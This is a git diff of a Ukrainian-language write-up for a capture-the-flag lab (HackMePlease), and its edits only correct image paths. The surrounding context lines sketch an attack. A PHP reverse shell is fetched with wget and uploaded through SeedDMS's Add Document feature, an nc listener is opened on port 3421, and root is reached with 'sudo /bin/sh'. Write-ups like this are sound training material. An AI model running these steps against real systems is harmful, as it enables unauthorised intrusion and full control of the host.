@@ -421,7 +421,7 @@ mysql -u seeddms -p -h 10.0.2.17 --ssl=0
 SHOW DATABASES;
 ```
 
-![databese](image-9.png)
+![databese](./HackMePlease/image-9.png)
 
 Серед доступних баз даних особливий інтерес викликала база:
 
@@ -508,7 +508,7 @@ WHERE login='admin';
 ```bash
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
-![php-1](image-17.png)
+![php-1](./HackMePlease/image-17.png)
 
 2. Модифікація параметрів `$ip` та `$port` відповідно до машини атакуючого.
 
@@ -517,12 +517,12 @@ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/ph
 
 3. Завантаження файлу через розділ **Add Document** у SeedDMS.
 
-![addDoc](image-19.png)
+![addDoc](./HackMePlease/image-19.png)
 
 4. Після завантаження, навівши курсор на файл, у нижньому лівому куті браузера видно шлях до файлу.
    З цього посилання визначається **ID документа** (у нашому випадку  `4`).
    **http://10.0.2.17/seeddms51x/seeddms-5.1.22/out/out.ViewDocument.php?documentid=4&showtree=1**
-![added](image-20.png)
+![added](./HackMePlease/image-20.png)
 
 5. Запуск **nc** та слухаємо порт **3421**:
 
@@ -602,5 +602,6 @@ sudo /bin/sh
 ##  Root-доступ отримано, вітання! 
 
 ![root_gained](./HackMePlease/image-27.png)
+
 
 
